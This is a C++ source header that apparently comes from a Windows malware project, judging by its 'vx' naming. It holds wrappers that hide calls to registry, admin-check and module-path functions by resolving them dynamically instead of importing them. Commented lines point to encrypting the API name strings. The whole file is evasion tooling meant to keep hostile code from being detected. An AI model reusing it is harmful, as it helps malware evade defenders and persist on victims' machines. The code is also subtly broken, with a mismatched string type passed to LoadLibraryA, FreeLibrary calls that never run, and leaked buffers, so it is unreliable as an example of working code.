#pragma once

#include "vxheader.h"
#include "replacements.h"

wchar_t *convertCharArrayToLPCWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

HMODULE hiddenLoadLibrary(LPCWSTR lpFileName) {
	const char * chkernel32 = "Kernel32.dll";
	LPCWSTR kernel32 = convertCharArrayToLPCWSTR(chkernel32);

	const char * loadlibrarya = "LoadLibraryA";

	MyLoadLibrary mLoadLibrary = (MyLoadLibrary)GetExportAddress(GetModuleBaseAddress(kernel32), loadlibrarya);

	HMODULE hForward = mLoadLibrary(lpFileName);

	return hForward;
}

FARPROC hiddenGetProcAddress(HMODULE hMod, LPCSTR lpProcName) {
	const char * chkernel32 = "Kernel32.dll";
	LPCWSTR kernel32 = convertCharArrayToLPCWSTR(chkernel32);

	const char * chgetprocaddress = "GetProcAddress";


	HMODULE hModule = hiddenLoadLibrary(kernel32);
	MyGetProcAddress gProc = (MyGetProcAddress)GetExportAddress(hModule, chgetprocaddress);
	FARPROC retval = gProc(hMod, lpProcName);
	return retval;
}

int vxRegQueryValueA(HKEY hKey, LPCSTR lpSubKey, LPSTR lpData, PLONG lpcbData) {

	const char * chadvapi = "Advapi32.dll";
	LPCWSTR advapi = convertCharArrayToLPCWSTR(chadvapi);

	HMODULE hModule = hiddenLoadLibrary(advapi);

	const char *chRegQueryValueA = "RegQueryValueA";

	if (hModule) {
		MyRegQueryValueA mRegQuery = 0;

		if (mRegQuery = (MyRegQueryValueA)hiddenGetProcAddress(hModule, chRegQueryValueA)) {
			int iReturnValue = mRegQuery(hKey, lpSubKey, lpData, lpcbData);
			return iReturnValue;
		}
		else {
			return 1;
		}
	}
	else {
		return 1;
	}

	FreeLibrary(hModule);
}

int vxRegOpenKeyA(HKEY hKey, LPCSTR SubKey, PHKEY phkResult) {
	const char * chadvapi = "Advapi32.dll";
	LPCWSTR advapi = convertCharArrayToLPCWSTR(chadvapi);

	HMODULE hModule = hiddenLoadLibrary(advapi);

	const char * chRegOpenKeyA = "RegOpenKeyA";

	if (hModule) {
		MyRegOpenKeyA mRegOpen = 0;
		if (mRegOpen = (MyRegOpenKeyA)hiddenGetProcAddress(hModule, chRegOpenKeyA)) {
			int iReturnValue = mRegOpen(hKey, SubKey, phkResult);
			return iReturnValue;
		}
		else {
			return 1;
		}
	}
	else {
		return 1;
	}
	/*MyRegOpenKeyA mRegOpen = 0;
	mRegOpen = (MyRegOpenKeyA)LoadProcAddress(L"Advapi32.dll", L"RegOpenKeyA");
	int retval = mRegOpen(hKey, SubKey, phkResult);*/

	FreeLibrary(hModule);
}

int vxRegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData) {
	const char * chadvapi = "Advapi32.dll";
	LPCWSTR advapi = convertCharArrayToLPCWSTR(chadvapi);

	HMODULE hModule = hiddenLoadLibrary(advapi);

	const char * chRegSetValueExA = "RegSetValueExA";

	if (hModule) {
		MyRegSetValueExA mRegSetValue = 0;
		if (mRegSetValue = (MyRegSetValueExA)hiddenGetProcAddress(hModule, chRegSetValueExA)) {
			int iReturnValue = mRegSetValue(hKey, lpValueName, Reserved, dwType, lpData, cbData);
			return iReturnValue;
		}
		else {
			return 1;
		}
	}
	else {
		return 1;
	}
	FreeLibrary(hModule);

}

int vxRegCloseKeyA(HKEY hKey) {
	const char *chadvapi = "Advapi32.dll";
	LPCWSTR advapi = convertCharArrayToLPCWSTR(chadvapi);

	HMODULE hModule = hiddenLoadLibrary(advapi);

	const char * chRegCloseKey = "RegCloseKey";
	if (hModule) {
		MyRegCloseKey mRegCloseKey = 0;
		if (mRegCloseKey = (MyRegCloseKey)hiddenGetProcAddress(hModule, chRegCloseKey)) {
			int iReturnValue = mRegCloseKey(hKey);
			return iReturnValue;
		}
		else {
			return 1;
		}
	}
	else {
		return 1;
	}
	FreeLibrary(hModule);
}

BOOL vxIsUserAnAdmin() {
	//	HMODULE hModule = LoadLibraryA("Shell32.dll");
	const char * chshell32 = "Shell32.dll";
	LPCWSTR shell32 = convertCharArrayToLPCWSTR(chshell32);

	HMODULE hModule = hiddenLoadLibrary(shell32);

	const char * chIsUserAnAdmin = "IsUserAnAdmin";
	if (hModule) {

		MyIsUserAnAdmin mIsAdmin = FALSE;
		if (mIsAdmin = (MyIsUserAnAdmin)hiddenGetProcAddress(hModule, chIsUserAnAdmin)) {
			BOOL bReturnValue = mIsAdmin();
			return bReturnValue;
		}
		else {
			return FALSE;
		}
	}
	else {
		return FALSE;
	}
	FreeLibrary(hModule);
}

DWORD vxGetModuleFileNameA(HMODULE hModule, LPSTR lpFileName, DWORD nSize) {
	//const char * chkernel32 = cryptor::create("Kernel32.dll").decrypt();
	//LPCWSTR kernel32 = convertCharArrayToLPCWSTR(chkernel32);

	//HMODULE hModuleLoadLibrary = hiddenLoadLibrary(kernel32);
	HMODULE hModuleLoadLibrary = hiddenLoadLibrary(L"Kernel32.dll");

	//const char * chGetModuleFileName = cryptor::create("GetModuleFileNameA").decrypt();
	const char * chGetModuleFileName = "GetModuleFileNameA";
	if (hModuleLoadLibrary) {


		MyGetModuleFileNameA mGetModFName = 0;

		if (mGetModFName = (MyGetModuleFileNameA)hiddenGetProcAddress(hModuleLoadLibrary, chGetModuleFileName)) {
			DWORD dwReturnValue = mGetModFName(hModule, lpFileName, nSize);
			return dwReturnValue;
		}
		else {
			return 1;
		}
	}
	else {
		return 1;
	}
	FreeLibrary(hModuleLoadLibrary);
}